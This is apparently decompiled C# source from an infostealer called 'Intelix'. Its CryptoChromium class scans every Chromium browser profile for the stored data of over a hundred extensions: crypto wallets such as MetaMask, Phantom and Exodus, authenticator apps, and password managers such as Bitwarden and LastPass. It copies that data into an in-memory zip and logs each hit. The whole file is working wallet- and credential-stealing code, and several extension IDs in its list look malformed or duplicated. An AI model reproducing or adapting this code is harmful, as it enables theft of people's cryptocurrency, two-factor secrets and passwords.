using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Browsers
{
	// Token: 0x02000038 RID: 56
	public class CryptoChromium : ITarget
	{
		// Token: 0x060000BC RID: 188 RVA: 0x0000A808 File Offset: 0x00008A08
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(Paths.Chromium, delegate(string browser)
			{
				bool flag = Directory.Exists(browser);
				if (flag)
				{
					Parallel.ForEach<string>(Directory.GetDirectories(browser), delegate(string profile)
					{
						string browsername = Paths.GetBrowserName(browser);
						string profilename = Path.GetFileName(profile);
						Task.Run(delegate()
						{
							this.GetChromeWallets(zip, counter, profile, profilename, browsername);
						});
					});
				}
			});
		}

		// Token: 0x060000BD RID: 189 RVA: 0x0000A848 File Offset: 0x00008A48
		private void GetChromeWallets(InMemoryZip zip, Counter counter, string profilePath, string profilename, string browserName)
		{
			string path = Path.Combine(profilePath, "Local Extension Settings");
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				Dictionary<string, string> extensionDirs = Directory.EnumerateDirectories(path).ToDictionary((string dir) => Path.GetFileName(dir).ToLowerInvariant(), (string dir) => dir);
				Parallel.ForEach<string[]>(this.ChromeWalletsDirectories, delegate(string[] walletInfo)
				{
					string key = walletInfo[1];
					string text;
					bool flag2 = extensionDirs.TryGetValue(key, out text);
					if (flag2)
					{
						zip.AddDirectoryFiles(text, string.Concat(new string[]
						{
							browserName,
							"_",
							profilename,
							" ",
							walletInfo[0]
						}), true);
						counter.CryptoChromium.Add(string.Concat(new string[]
						{
							text,
							" => ",
							browserName,
							"_",
							profilename,
							" ",
							walletInfo[0]
						}));
					}
				});
			}
		}

		// Token: 0x04000013 RID: 19
		private readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Trust Wallets",
				"pknlccmneadmjbkollckpblgaaabameg"
			},
			new string[]
			{
				"MetaWallet",
				"pfknkoocfefiocadajpngdknmkjgakdg"
			},
			new string[]
			{
				"Guarda Wallet",
				"fcglfhcjfpkgdppjbglknafgfffkelnm"
			},
			new string[]
			{
				"Exodus",
				"idkppnahnmmggbmfkjhiakkbkdpnmnon"
			},
			new string[]
			{
				"JaxxxLiberty",
				"mhonjhhcgphdphdjcdoeodfdliikapmj"
			},
			new string[]
			{
				"Atomic Wallet",
				"bhmlbgebokamljgnceonbncdofmmkedg"
			},
			new string[]
			{
				"Mycelium",
				"pidhddgciaponoajdngciiemcflpnnbg"
			},
			new string[]
			{
				"Coinomi",
				"blbpgcogcoohhngdjafgpoagcilicpjh"
			},
			new string[]
			{
				"GreenAddress",
				"gflpckpfdgcagnbdfafmibcmkadnlhpj"
			},
			new string[]
			{
				"Edge",
				"doljkehcfhidippihgakcihcmnknlphh"
			},
			new string[]
			{
				"BRD",
				"nbokbjkelpmlgflobbohapifnnenbjlh"
			},
			new string[]
			{
				"Samourai Wallet",
				"apjdnokplgcjkejimjdfjnhmjlbpgkdi"
			},
			new string[]
			{
				"Copay",
				"ieedgmmkpkbiblijbbldefkomatsuahh"
			},
			new string[]
			{
				"Bread",
				"jifanbgejlbcmhbbdbnfbfnlmbomjedj"
			},
			new string[]
			{
				"KeepKey",
				"dojmlmceifkfgkgeejemfciibjehhdcl"
			},
			new string[]
			{
				"Trezor",
				"jpxupxjxheguvfyhfhahqvxvyqthiryh"
			},
			new string[]
			{
				"Ledger Live",
				"pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln"
			},
			new string[]
			{
				"Ledger Wallet",
				"hbpfjlflhnmkddbjdchbbifhllgmmhnm"
			},
			new string[]
			{
				"Bitbox",
				"ocmfilhakdbncmojmlbagpkjfbmeinbd"
			},
			new string[]
			{
				"Digital Bitbox",
				"dbhklojmlkgmpihhdooibnmidfpeaing"
			},
			new string[]
			{
				"YubiKey",
				"mammpjaaoinfelloncbbpomjcihbkmmc"
			},
			new string[]
			{
				"Nifty Wallet",
				"jbdaocneiiinmjbjlgalhcelgbejmnid"
			},
			new string[]
			{
				"Math Wallet",
				"afbcbjpbpfadlkmhmclhkeeodmamcflc"
			},
			new string[]
			{
				"Coinbase Wallet",
				"hnfanknocfeofbddgcijnmhnfnkdnaad"
			},
			new string[]
			{
				"Equal Wallet",
				"blnieiiffboillknjnepogjhkgnoac"
			},
			new string[]
			{
				"EVER Wallet",
				"cgeeodpfagjceefieflmdfphplkenlfk"
			},
			new string[]
			{
				"Jaxx Liberty",
				"ocefimbphcgjaahbclemolcmkeanoagc"
			},
			new string[]
			{
				"BitApp Wallet",
				"fihkakfobkmkjojpchpfgcmhfjnmnfpi"
			},
			new string[]
			{
				"Mew CX",
				"nlbmnnijcnlegkjjpcfjclmcfggfefdm"
			},
			new string[]
			{
				"GU Wallet",
				"nfinomegcaccbhchhgflladpfbajihdf"
			},
			new string[]
			{
				"Guild Wallet",
				"nanjmdkhkinifnkgdeggcnhdaammmj"
			},
			new string[]
			{
				"Saturn Wallet",
				"nkddgncdjgifcddamgcmfnlhccnimig"
			},
			new string[]
			{
				"Harmony Wallet",
				"fnnegphlobjdpkhecapkijjdkgcjhkib"
			},
			new string[]
			{
				"TON Wallet",
				"nphplpgoakhhjchkkhmiggakijnkhfnd"
			},
			new string[]
			{
				"OpenMask Wallet",
				"penjlddjkjgpnkllboccdgccekpkcbin"
			},
			new string[]
			{
				"MyTonWallet",
				"fldfpgipfncgndfolcbkdeeknbbbnhcc"
			},
			new string[]
			{
				"DeWallet",
				"pnccjgokhbnggghddhahcnaopgeipafg"
			},
			new string[]
			{
				"TrustWallet",
				"egjidjbpglichdcondbcbdnbeeppgdph"
			},
			new string[]
			{
				"NC Wallet",
				"imlcamfeniaidioeflifonfjeeppblda"
			},
			new string[]
			{
				"Moso Wallet",
				"ajkifnllfhikkjbjopkhmjoieikeihjb"
			},
			new string[]
			{
				"Enkrypt Wallet",
				"kkpllkodjeloidieedojogacfhpaihoh"
			},
			new string[]
			{
				"CirusWeb3 Wallet",
				"kgdijkcfiglijhaglibaidbipiejjfdp"
			},
			new string[]
			{
				"Martian and Sui Wallet",
				"efbglgofoippbgcjepnhiblaibcnclgk"
			},
			new string[]
			{
				"SubWallet",
				"onhogfjeacnfoofkfgppdlbmlmnplgbn"
			},
			new string[]
			{
				"Pontem Wallet",
				"phkbamefinggmakgklpkljjmgibohnba"
			},
			new string[]
			{
				"Talisman Wallet",
				"fijngjgcjhjmmpcmkeiomlglpeiijkld"
			},
			new string[]
			{
				"Kardiachain Wallet",
				"pdadjkfkgcafgbceimcpbkalnfnepbnk"
			},
			new string[]
			{
				"Phantom Wallet",
				"bfnaelmomeimhipmgjnjophhpkkoljpa"
			},
			new string[]
			{
				"Phantom Wallet",
				"bfnaelmomeimhlpmgjnjophhpkkoljpa"
			},
			new string[]
			{
				"Oxygen Wallet",
				"fhilaheimglignddjgofkcbgekhenbh"
			},
			new string[]
			{
				"PaliWallet",
				"mgfffbidihjpoaomajlbgchddlicgpn"
			},
			new string[]
			{
				"BoltX Wallet",
				"aodkkagnadcbobfpggnjeongemjbjca"
			},
			new string[]
			{
				"Liquality Wallet",
				"kpopkelmapcoipemfendmdghnegimn"
			},
			new string[]
			{
				"xDefi Wallet",
				"hmeobnffcmdkdcmlb1gagmfpfboieaf"
			},
			new string[]
			{
				"Nami Wallet",
				"ipfcbjknijpeeillifnkikgncikgfhdo"
			},
			new string[]
			{
				"MaiarDeFi Wallet",
				"dngmlblcodfobpdpecaadgfbeggfjfnm"
			},
			new string[]
			{
				"MetaMask Wallet",
				"nkbihfbeogaeaoehlefnkodbefgpgknn"
			},
			new string[]
			{
				"MetaMask Wallet",
				"djclckkglechooblngghdinmeemkbgci"
			},
			new string[]
			{
				"MetaMask Wallet",
				"ejbalbakoplchlghecdalmeeeajnimhm"
			},
			new string[]
			{
				"Goblin Wallet",
				"mlbafbjadjidk1bhgopoamemfibcpdfi"
			},
			new string[]
			{
				"Braavos Smart Wallet",
				"jnlgamecbpmbajjfhmmmlhejkemejdma"
			},
			new string[]
			{
				"UniSat Wallet",
				"ppbibelpcjmhbdihakflkdcoccbgbkpo"
			},
			new string[]
			{
				"OKX Wallet",
				"mcohilncbfahbmgdjkbpemcciiolgcge"
			},
			new string[]
			{
				"Manta Wallet",
				"enabgbdfcbaehmbigakijjabdpdnimlg"
			},
			new string[]
			{
				"Suku Wallet",
				"fopmedgnkfpebgllppeddmmochcookhc"
			},
			new string[]
			{
				"Suiet Wallet",
				"khpkpbbcccdmmclmpigdgddabeilkdpd"
			},
			new string[]
			{
				"Koala Wallet",
				"lnnnmfcpbkafcpgdilckhmhbkkbpkmid"
			},
			new string[]
			{
				"ExodusWeb3 Wallet",
				"aholpfdialjgjfhomihkjbmgjidlcdno"
			},
			new string[]
			{
				"Aurox Wallet",
				"kilnpioakcdndlodeeceffgjdpojajlo"
			},
			new string[]
			{
				"Fewcha Move Wallet",
				"ebfidpplhabeedpnhjnobghokpiioolj"
			},
			new string[]
			{
				"Carax Demon Wallet",
				"mdjmfdffdcmnoblignmgpommbefadffd"
			},
			new string[]
			{
				"Leap Terra Wallet",
				"aijcbedoijmgnlmjeegjaglmepbmpkpi"
			},
			new string[]
			{
				"Keplr Wallet",
				"dmkamcknogkgcdfhhbddcghachkejeap"
			},
			new string[]
			{
				"Binance Chain Wallet",
				"fhbohimaelbohpjbbldcngcnapndodjp"
			},
			new string[]
			{
				"Yoroi Wallet",
				"ffnbelfdoeiohenkjibnmadjiehjhajb"
			},
			new string[]
			{
				"Rabby Wallet",
				"acmacodkjbdgmoleebolmdjonilkdbch"
			},
			new string[]
			{
				"TokenPocket",
				"mfgccjchihfkkindfppnaooecgfneiii"
			},
			new string[]
			{
				"SafePal Extension Wallet",
				"lgmpcpglpngdoalbgeoldeajfclnhafa"
			},
			new string[]
			{
				"Magic Eden Wallet",
				"mkpegjkblkkefacfnmkajcjmabijhclg"
			},
			new string[]
			{
				"Ronin",
				"fnjhmkhhmkbjkkabndcnnogagogbneec"
			},
			new string[]
			{
				"Coin98",
				"aeachknmefphepccionboohckonoeemg"
			},
			new string[]
			{
				"TerraStation",
				"aiifbnbfobpmeekipheeijimdpnlpgpp"
			},
			new string[]
			{
				"Wombat",
				"amkmjjmmflddogmhpjloimipbofnfjih"
			},
			new string[]
			{
				"Nami",
				"lpfcbjknijpeeillifnkikgncikgfhdo"
			},
			new string[]
			{
				"XDEFI",
				"hmeobnfnfcmdkdcmlblgagmfpfboieaf"
			},
			new string[]
			{
				"Tron",
				"ibnejdfjmmkpcnlpebklmnkoeoihofec"
			},
			new string[]
			{
				"Authenticator",
				"bhghoamapcdpbohphigoooaddinpkbai"
			},
			new string[]
			{
				"Google Authenticator",
				"khcodhlfkpmhibicdjjblnkgimdepgnd"
			},
			new string[]
			{
				"Microsoft Authenticator",
				"bfbdnbpibgndpjfhonkflpkijfapmomn"
			},
			new string[]
			{
				"Authy",
				"gjffdbjndmcafeoehgdldobgjmlepcal"
			},
			new string[]
			{
				"Duo Mobile",
				"eidlicjlkaiefdbgmdepmmicpbggmhoj"
			},
			new string[]
			{
				"OTP Auth",
				"bobfejfdlhnabgglompioclndjejolch"
			},
			new string[]
			{
				"FreeOTP",
				"elokfmmmjbadpgdjmgglocapdckdcpkn"
			},
			new string[]
			{
				"Aegis Authenticator",
				"ppdjlkfkedmidmclhakfncpfdmdgmjpm"
			},
			new string[]
			{
				"LastPass Authenticator",
				"cfoajccjibkjhbdjnpkbananbejpkkjb"
			},
			new string[]
			{
				"Dashlane",
				"flikjlpgnpcjdienoojmgliechmmheek"
			},
			new string[]
			{
				"Keeper",
				"gofhklgdnbnpcdigdgkgfobhhghjmmkj"
			},
			new string[]
			{
				"RoboForm",
				"hppmchachflomkejbhofobganapojjol"
			},
			new string[]
			{
				"KeePass",
				"lbfeahdfdkibininjgejjgpdafeopflb"
			},
			new string[]
			{
				"KeePassXC",
				"kgeohlebpjgcfiidfhhdlnnkhefajmca"
			},
			new string[]
			{
				"Bitwarden",
				"inljaljiffkdgmlndjkdiepghpolcpki"
			},
			new string[]
			{
				"NordPass",
				"njgnlkhcjgmjfnfahdmfkalpjcneebpl"
			},
			new string[]
			{
				"LastPass",
				"gabedfkgnbglfbnplfpjddgfnbibkmbb"
			},
			new string[]
			{
				"Rainbow Wallet",
				"opfgelmcmbiajamepnmloijbpoleiama"
			},
			new string[]
			{
				"Frame Wallet",
				"ldcoohedfbjoobcadoglnnmmfbdlmmhf"
			},
			new string[]
			{
				"Backpack Wallet",
				"aflkmfhebedbjioipglgcbcmnbpgliof"
			},
			new string[]
			{
				"Solflare Wallet",
				"bhhhlbepdkbapadjdnnojkbgioiodbic"
			},
			new string[]
			{
				"Slope Wallet",
				"pocmplpaccanhmnllbbkpgfliimjljgo"
			},
			new string[]
			{
				"Glow Wallet",
				"ojbcfhjmpigfobfclfflafhblgemeidi"
			},
			new string[]
			{
				"Petra Aptos Wallet",
				"ejjladinnckdgjemekebdpeokbikhfci"
			},
			new string[]
			{
				"Sender Wallet",
				"epapihdplajcdnnkdeiahlgigofloibg"
			},
			new string[]
			{
				"Leap Cosmos Wallet",
				"fcfcfllfndlomdhbehjjcoimbgofdncg"
			},
			new string[]
			{
				"Eternl Wallet",
				"kmhcihpebfmpgmihbkipmjlmmioameka"
			},
			new string[]
			{
				"Flint Wallet",
				"hnhobjmcibchnmglfbldbfabcgaknlkj"
			},
			new string[]
			{
				"NuFi Wallet",
				"gpnihlnnodeiiaakbikldcihojploeca"
			},
			new string[]
			{
				"Lace Wallet",
				"gafhhkghbfjjkeiendhlofajokpaflmk"
			},
			new string[]
			{
				"Vespr Wallet",
				"ljmpcjnfkmlcpgdgbfghdncjhpcbhknh"
			},
			new string[]
			{
				"Typhon Wallet",
				"kfdniefadaanbjodldohaedphafoffoh"
			}
		};
	}
}
